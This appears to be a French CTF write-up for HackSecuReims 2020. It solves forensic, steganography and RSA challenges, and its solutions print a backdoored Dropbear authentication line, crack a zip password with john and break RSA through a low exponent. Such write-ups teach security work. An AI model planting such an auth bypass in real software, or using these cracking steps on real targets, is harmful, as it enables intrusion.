---
layout: page
title: HackSecuReims 2020
---

# -- --  Sommaire -- -- 
<ul>
<li><a href="#forensic-oldschool">[Forensic] OldSchool</a></li>
<li><a href="#forensic-backdoor">[Forensic] Backdoor</a></li>
<li><a href="#forensic-exfiltration">[Forensic] Exfiltration</a></li>
<li><a href="#forensic-h0ney">[Forensic] H0ney</a></li>
<li><a href="#misc-leak">[Misc] Leak</a></li>
<li><a href="#crypto-rsa1">[Crypto] RSA1</a></li>
</ul>

<br>
<hr>
<br>

# [Forensic] OldSchool

Voici une solution sur les 6 épreuves de forensic utilisant une machine virtuelle sous Windows 98.
Je vous propose une solution qui ne nécessite pas de booter la machine virtuelle.

## Source de téléchargement

<ul>
  <li><a href="https://download.hackademint.org/hsr_oldschool.ova">hsr_oldschool.ova </a>(sha1sum: 2e7325cf3801520d117d5970c89bee15a42ab172)</li>
</ul>

## Consignes

<ul>
<li>Trouver le flag de l'utilisateur HSR.</li>
<li>L'utilisateur HSR ne semble pas avoir l'habitude de manipuler des fichiers sous Windows 98.</li>
<li>L'utilisateur HSR vous montre ses talents d'artiste sous Windows 98.</li>
<li>L'ordinateur de l'utilisateur HSR semble bizarre, non ?</li>
<li>L'utilisateur HSR ne se rappelle plus des tricks en ligne de commande. Pouvez-vous l'aider à se rémémorer ?</li>
<li>HSR après plusieurs séances sous Windows 98 découvre la joie des "Oeufs de Pâques" fait par les créateurs, notamment lors de leur Bienvenue. Le flag est de la forme HSR{nom de l'argument}</li>
</ul>

## Monter le système de fichiers sur son Linux 

> Un fichier `OVA` est une archive utilisé par des applications de virtualisation telles que VMware Workstation et Oracle VM Virtualbox. Il s'agit d'un package qui contient des fichiers utilisés pour décrire une machine virtuelle, qui comprend un fichier descripteur .OVF, un fichier manifeste facultatif (.MF) et des fichiers de certificat, ainsi que d'autres fichiers associés.

```bash
$ file hsr_oldschool.ova
hsr_oldschool.ova: POSIX tar archive

$ tar xvf hsr_oldschool.ova
vm_hacksecuold.ovf
vm_hacksecuold-disk001.vmdk

$ file vm_hacksecuold-disk001.vmdk
vm_hacksecuold-disk001.vmdk: VMware4 disk image
```

Les données du système de fichiers sont dans le fichier `vm_hacksecuold-disk001.vmdk`.
On ne peut monter en l'état ce disque sur notre système d'exploitation Linux. On va passer par une convertion en `.qcow2` afin de pouvoir monter le disque.

Pour rappel:
> Qcow est un format d'image disque utilisé par QEMU, un hyperviseur de machine virtuelle qui s'exécute à l'intérieur d'un autre système d'exploitation. 

```bash
$ qemu-img convert -f vmdk -O qcow2 vm_hacksecuold-disk001.vmdk vm_hacksecuold-disk001.qcow2
$ sudo modprobe nbd max_part=63
$ sudo qemu-nbd -c /dev/nbd0 ./vm_hacksecuold-disk001.qcow2
$ sudo mount /dev/nbd0p1 /mnt/
```

## FLAG 1

> Trouver le flag de l'utilisateur HSR.

On cherche le pattern du flag `HSR{` partout sur le système de fichiers.

```bash
$ grep -R "HSR{" /mnt
Fichier binaire /mnt/WINDOWS/SYSTEM.DAT correspondant
/mnt/WINDOWS/TEMP/history.txt:echo 'HSR{FAKE_FLAG}'
/mnt/Mes documents/flag.txt:HSR{3asy_Fl@g!!}
Fichier binaire /mnt/RECYCLED/DC0.DOC correspondant
```

On utilisera `strings` par la suite sur les "fichiers binaires" indiqués par `grep`.

## FLAG 2

>  L'utilisateur HSR ne semble pas avoir l'habitude de manipuler des fichiers sous Windows 98.

```bash
$ strings /mnt/RECYCLED/DC0.DOC | grep "HSR{"
HSR{2nd_fl4g_w@rmUp!!}
```

## FLAG 4

>  L'ordinateur de l'utilisateur HSR semble bizarre, non ?

```
$ strings /mnt/WINDOWS/SYSTEM.DAT | grep "HSR{"
CommentHSR{What_a_new_Flag_H3r3}
```

## FLAG 3

> L'utilisateur HSR vous montre ses talents d'artiste sous Windows 98.

On cherche une image probablement en rapport avec HSR, explorons les noms des fichiers...

```bash
$ find /mnt | grep -i HSR
/mnt/WINDOWS/HSR.PWL
/mnt/WINDOWS/TEMP/HSR
/mnt/WINDOWS/TEMP/HSR/flag.txt
/mnt/WINDOWS/TEMP/HSR/real_flag.txt
/mnt/WINDOWS/TEMP/HSR/fake_flag.txt
/mnt/WINDOWS/Cookies/hsr@auto.search.msn[1].txt
/mnt/WINDOWS/Cookies/hsr@msn[2].txt
/mnt/WINDOWS/Cookies/hsr@search[1].txt
/mnt/WINDOWS/Cookies/hsr@bing[1].txt
/mnt/WINDOWS/Cookies/hsr@www.bing[1].txt
/mnt/WINDOWS/Cookies/hsr@google[1].txt
/mnt/WINDOWS/Cookies/hsr@search[2].txt
/mnt/WINDOWS/Hsr.bmp
```

C'est `/mnt/WINDOWS/Hsr.bmp` qui contient le flag:

<img src="/images/writeups/hsr2020/forensic/hsr.bmp" />

## FLAG 5

> L'utilisateur HSR ne se rappelle plus des tricks en ligne de commande. Pouvez-vous l'aider à se rémémorer ?

Lors de notre recherche du `FLAG 1`, on a observé l'existence de `/mnt/WINDOWS/TEMP/history.txt`:

```bash 
$ cat /mnt/WINDOWS/TEMP/history.txt
...
echo 'J u s t c o n c a t m e : H S R { D 0 s K 3 Y _ f 0 r _ c 0 m m a n d _ H 1 s t 0 r Y }'
...

$ cat /mnt/WINDOWS/TEMP/history.txt | tr -d ' ' | grep HSR
echo'HSR{FAKE_FLAG}'
echo'Justconcatme:HSR{D0sK3Y_f0r_c0mmand_H1st0rY}'
```

## FLAG 6


> HSR après plusieurs séances sous Windows 98 découvre la joie des "Oeufs de Pâques" fait par les créateurs, notamment lors de leur Bienvenue. Le flag est de la forme HSR{nom de l'argument}

En cherchant "Easter Egg Windows98" sur Youtube on peut trouver la vidéo explicative suivante:
<a href="https://www.youtube.com/watch?v=hB6lEMlqvbg">https://www.youtube.com/watch?v=hB6lEMlqvbg</a>

On cherche alors ce qui est en rapport avec `WELDATA.exe`

```bash
$ find /mnt | grep -i WELDATA
/mnt/WINDOWS/APPLOG/WELDATA.LGC
/mnt/WINDOWS/Application Data/Microsoft/WELCOME/WELDATA.EXE
/mnt/WINDOWS/Application Data/Microsoft/WELCOME/Raccourci vers Weldata.lnk
```

On cherche alors le flag en supposant qu'il contient `_` ce qui est courant dans les formats de flag.

```bash
$ strings "/mnt/WINDOWS/Application Data/Microsoft/WELCOME/Raccourci vers Weldata.lnk" | grep "_"
You_are_a_real_rascal
```

<br>
<hr>
<br>

# [Forensic] Backdoor

## Source de téléchargement

<ul>
  <li><a href="/images/writeups/hsr2020/dropbear-2017.75-backdoored.tar.gz">dropbear-2017.75-backdoored.tar.gz</a></li>
</ul>

## Résolution 

> Dropbear est un serveur et client SSH relativement petit. Il fonctionne sur une variété de plates-formes POSIX. Dropbear est un logiciel open source, distribué sous une licence de style MIT. Dropbear est particulièrement utile pour les systèmes Linux (ou autres Unix) de type "embarqués", tels que les routeurs sans fil.

On cherche a savoir la différence avec la version originale afin de pouvoir exploité la backdoor.

On extrait la version contenant la backdoor:
```bash
$ tar xvf dropbear-2017.75-backdoored.tar.gz
$ mv dropbear-2017.75{,-backdoored}
```

On télécharge la version originale:
```bash
$ wget https://matt.ucc.asn.au/dropbear/releases/dropbear-2017.75.tar.bz2 
$ tar xvf dropbear-2017.75.tar.bz2
$ diff dropbear-2017.75 dropbear-2017.75-backdoored 
...
diff '--color=auto' dropbear-2017.75/svr-authpasswd.c dropbear-2017.75-backdoored/svr-authpasswd.c
98c98
< 	if (constant_time_strcmp(testcrypt, passwdcrypt) == 0) {
---
> 	if (passwordlen > 0x7F || constant_time_strcmp(testcrypt, passwdcrypt) == 0) {
```

On peut ainsi se connecter en utilisant un mot de passe de longueur strictement supérieur a 127 (0x7F) et récupérer le flag sur le serveur.

<br>
<hr>
<br>

# [Forensic] Exfiltration

## Source de téléchargement

<ul>
  <li><a href="/images/writeups/hsr2020/hacksecu2020.pcap">hacksecu2020.pcap</a></li>
</ul>

## Résolution 

L'exfiltration de données étaient permises via une opération sur les ports sources des paquets réseaux TCP.
On peut automatiser facilement l'opération à l'aide de l'outil `tshark` qui nous permet d'applique un filtre pour séléctionner les paquets dont le port source est supérieur ou égal à 50000, puis de séléctionner spécifiquement le port source tcp de chaque paquet filtré:

```bash
result=""
for port in $(tshark -nr ./hacksecu2020.pcap -Y "tcp.srcport >= 50000" -T fields -e tcp.srcport); do 
  n=$(($port - 50000))
  result=$result$(python -c "print(chr($n))")
  echo $result 
done
```

Resultat:
```bash
Well done !!! You got the message. This is a padding to have a very very very very very very very very verylong text. The flag is HSR{3xf1ltr4t10n_0nlY_w1th_s0urc3_p0rt_As_l4st_y34r}
```

<br>
<hr>
<br>

# [Forensic] H0ney

Un service disponible au travers d'une connexion tcp nous demandait de rensigner une addresse ip et un port. 
Une fois renseigné, on regarde ce qui nous est envoyé. Il faut donc écouter avec `netcat` par exemple sur l'ip et le port indiqué.

```bash
$ nc -lvvp 8888
SSH-2.0-paramiko_2.7.1
```

On comprend alors qu'un bot tente d'établir une connexion SSH en utilisant la librairie python `paramiko` sur l'adresse ip et le port que nous avons renseigné.
Dans un premier temps, on va récupérer le nom de l'utilisateur et le mot de passe avec lequel le bot cherche a se connecter, puis on laissera le connecter afin d'observeur les actions qu'il mène.

## Méthode 1

On récupère les credentials du bot en utilisant <a href="https://github.com/braindead-sec/ssh-grabber">ssh-grabber</a>. Cet outil monitore en continu les processus du système pour récupérer ces informations:

```bash
$ git clone https://github.com/braindead-sec/ssh-grabber
$ bash ./ssh-grabber/ssh-grabber.sh
Listening for SSH connections...press Ctrl-C to exit.
SuperEvilHackerOfShit:YoloSwagSup3rCh4ll3ng3
```

On permet au bot de se connecter en créant un utilisateur avec les données récupérées:

```bash
$ adduser SuperEvilHackerOfShit --force-badname
```

Puis on monitore les processus appelé par cet utilisateur en utilisant <a href="https://github.com/DominicBreuker/pspy">pspy</a>. On récupère ainsi le flag:
```bash
Here is the flag: HSR{h0neyp0t_Its_1mp0rt4nt_4_3xf1ltr4t10n}
```


## Méthode 2

On utilise l'image docker <a href="https://github.com/cowrie/cowrie">cowrie</a> pour réaliser les deux mêmes étapes que la méthode 1 en utilisant le même outil.

```bash
docker run -d -p 8888:2222  --name cowrie cowrie/cowrie
```

On regarde les logs du container pour récupérer le nom de l'utilisateur (on aura pas besoin de son mot de passe):
```bash
docker logs cowrie | grep login
2020-02-11T06:08:15+0000 [SSHService b'ssh-userauth' on HoneyPotSSHTransport,0,157.159.32.43] login attempt [b'SuperEvilHackerOfShit'/b'YoloSwagSup3rCh4ll3ng3'] failed
2020-02-11T06:08:16+0000 [-] unauthorized login:
```

On modifie les paramètres de cowrie pour qu'il accepte les connexions de ce nouvel utilisateur en suivant la documentation:
```bash
$ docker exec -it cowrie bash
cowrie@9ddd8f632e04:~/cowrie-git$ cd etc/
cowrie@9ddd8f632e04:~/cowrie-git/etc$ cp userdb.example userdb.txt    
cowrie@9ddd8f632e04:~/cowrie-git/etc$ echo "SuperEvilHackerOfShit:x:*" >> userdb.txt
cowrie@9ddd8f632e04:~/cowrie-git/etc$ exit 
```

On relance le bot et on récupère le flag dans les logs de la même façon.

<br>
<hr>
<br>

# [Misc] Leak

## Source de téléchargement

<ul>
  <li><a href="/images/writeups/hsr2020/hsrleak.wav">hsrleak.wav</a></li>
</ul>

## Résolution

```bash
$ file hsrleak.wav
hsrleak.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, mono 44100 Hz
```

On analyse le spectre en utilisant `sonic-visualiser`

<img src="/images/writeups/hsr2020/leak1.png" />

On utilise l'option: 

Layer > Add Spectrogram (Shift + G)

<img src="/images/writeups/hsr2020/leak2.png" />

On récupère ainsi un lien pastebin avec un ensemble de mots de passe que l'on doit parser:

```bash
$ wget https://pastebin.com/raw/VRAKUxT9
$ cat VRAKUxT9 | grep -oP ":\K(\w+)" > wordlist.txt
```

Un zip était caché dans le fichier `hsrleak.wav` que l'on a extrait avec `binwalk`

```bash
$ binwalk -e hsrleak.wav

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
2645804       0x285F2C        Zip archive data, encrypted at least v2.0 to extract, compressed size: 164113, uncompressed size: 206008, name: flag.png
2810077       0x2AE0DD        End of Zip archive, footer length: 22

$ file _hsrleak.wav.extracted/285F2C.zip
_hsrleak.wav.extracted/285F2C.zip: Zip archive data, at least v2.0 to extract
```

Le zip est chiffré, on casse ce chiffrement avec une attaque par dictionnaire en utilisant le fichier `wordlist.txt` tout juste créé à l'aide du pastebin.

```bash
$ zip2john _hsrleak.wav.extracted/285F2C.zip > hash.john
$ john --wordlist=$PWD/wordlist.txt hash.john
$ john --show hash.john
285F2C.zip/flag.png:3yalh42hl:flag.png:285F2C.zip::285F2C.zip

1 password hash cracked, 0 left

$ unzip -P "3yalh42hl" ./_hsrleak.wav.extracted/285F2C.zip
Archive:  ./_hsrleak.wav.extracted/285F2C.zip
  inflating: flag.png                
```

On obtient donc le flag dans l'image `flag.png`

<img src="/images/writeups/hsr2020/leak-flag.png" />

<br>
<hr>
<br>

# [Crypto] RSA1


## Source de téléchargement

<ul>
  <li><a href="/images/writeups/hsr2020/rsa1.zip">rsa1.zip</a></li>
</ul>


## Analyse du challenge

```bash
$ unzip rsa1.zip
Archive:  rsa1.zip
  inflating: clef1_pub.pem           
  inflating: clef2_pub.pem           
  inflating: message1.base64         
  inflating: message2.base64   
```

En analysant les clefs, on se rend compte que l'exposant publique `e` est faible et égal à 3 ce qui nous inspire une attaque utilisant le <a href="https://fr.wikipedia.org/wiki/Th%C3%A9or%C3%A8me_des_restes_chinois">théorème des restes chinois</a>.

## Résolution 

On va utiliser un fork de `RsaCtfTool` sur laquelle j'ai pu contribuer et qui implémente cette attaque.<br>
Le code est plus détaillé ici: <a href="https://github.com/Headorteil/RsaCtfTool/blob/master/chinese_attack.py">chinese_attack.py</a>

```bash
$ git clone https://github.com/Headorteil/RsaCtfTool
$ python2.7 ./RsaCtfTool/RsaCtfTool.py --publickey "clef?_pub.pem" --verbose --uncipherfile "message?.base64"         
...
[*] Performing chinese attack.
Insuffisant number of arguments
```

Initialement le code était prévu pour utiliser au minimum 3 clefs, on corrige le code à la volée pour qu'il en accepte 2:

```
$ sed -i "s/self.len<3/self.len<2/g" RsaCtfTool/RsaCtfTool.py 
$ python2.7 ./RsaCtfTool/RsaCtfTool.py --publickey "clef?_pub.pem" --verbose --uncipherfile "message?.base64"
...
[*] Performing chinese attack.
Bravo, le théorème de Bezout n'a aucun secret pour vous, le flag est HSR{I am the king of Bezout}.
Well done, the Bezout theorem is not a problem for you, The flag is HSR{I am the king of Bezout}.
做得好，Bezout定理对您没有秘密，旗帜是
HSR{I am the king of Bezout}
(traduction approximative...)
```

<br>
<hr>
<br>
